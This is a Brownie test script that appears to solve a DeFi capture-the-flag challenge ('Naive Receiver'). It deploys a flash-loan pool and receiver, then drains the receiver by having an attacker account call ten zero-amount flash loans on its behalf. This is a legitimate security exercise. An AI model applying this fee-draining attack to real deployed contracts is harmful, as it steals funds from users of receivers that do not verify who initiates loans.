from brownie import NaiveReceiverLenderPool, FlashLoanReceiver, Wei, accounts, reverts


# deploy the contracts / set up
# come up with the exploit
# test your exploit

# Pool has 1k * 10**18 wei
ETHER_IN_POOL = Wei("1000 ether")
ETHER_IN_RECEIVER = Wei("10 ether")


def setup_contracts():
    deployer = accounts[0]
    attacker = accounts[1]

    #deploying contracts 🚀
    #token = WETH9.deploy({"from": deployer})
    pool = NaiveReceiverLenderPool.deploy({"from": deployer})
    receiver = FlashLoanReceiver.deploy(pool, {"from": deployer})
    

    #configuring the contracts 🧑‍💻
    
    deployer.transfer(pool, ETHER_IN_POOL)
    deployer.transfer(receiver, ETHER_IN_RECEIVER)
    
    #transfer 100 tokens to the attacker(🫵)
    #token.transfer(attacker, ETHER_IN_POOL, {'from': deployer})

    assert pool.balance() == ETHER_IN_POOL
    assert receiver.balance() == ETHER_IN_RECEIVER

    return deployer, attacker, receiver, pool
    


def test_attacking_the_contract():
    
    deployer, attacker, receiver, pool  = setup_contracts()
    quagmire = accounts[3]

    # CODE YOUR EXPLOIT HERE 😈
    for i in range (10):
        pool.flashLoan(receiver, 0, {"from": attacker})
    

    # SUCCESS CONDITIONS 🕺
    # It's no longer possible to execute flash loans
    with reverts():
       pool.flashLoan(receiver, 0, {"from": quagmire})
